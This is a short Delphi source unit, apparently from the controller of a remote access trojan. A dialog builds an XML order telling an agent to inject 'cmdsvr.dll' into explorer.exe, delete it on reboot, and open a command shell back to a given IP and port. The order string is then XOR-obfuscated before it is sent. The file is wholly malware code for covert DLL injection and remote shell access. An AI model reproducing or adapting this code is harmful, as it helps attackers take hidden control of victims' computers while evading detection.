unit udlgCMD;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons;

type
  TfdlgCMD = class(TForm)
    rdoTelnet: TRadioButton;
    rdoSystem: TRadioButton;
    rdoCurrentUser: TRadioButton;
    BitBtn1: TBitBtn;
    BitBtn2: TBitBtn;
  private
    { Private declarations }
  public
    { Public declarations }
    function CreateOrder():string;
  end;

var
  fdlgCMD: TfdlgCMD;

implementation

{$R *.dfm}
function TfdlgCMD.CreateOrder():string;
const
  KEY='1';
var
  ss:tstrings;
  i:integer;
begin
  ss:=tstringlist.Create;
  ss.Add('<func>');
  ss.Add('<ID>1</ID>');
  ss.Add('<svrfile>cmdsvr.dll</svrfile>');
  ss.Add('<lcadir>%SystemRoot%\System32</lcadir>');
  //ss.Add('<lcafile></lcafile>');
  ss.Add('<thread>false</thread>');
  ss.Add('<op>injlibrary</op>');
  ss.Add('<PID>explorer.exe</PID>');
  ss.Add('<rebootdel>true</rebootdel>');
  ss.Add('<params>');
  ss.Add('<IP>192.168.1.2</IP>');
  ss.Add('<port>20541</port>');//ss.Add('<port>7618</port>');
  ss.Add('</params>');
  ss.Add('</func>');
  result:=ss.Text;
  while pos(#$D#$A,result)>0 do
    delete(result,pos(#$D#$A,result),2);
  for i:=1 to length(result) do
    result[i]:=char(ord(result[i]) xor ord(KEY));
  ss.Free;
end;
end.
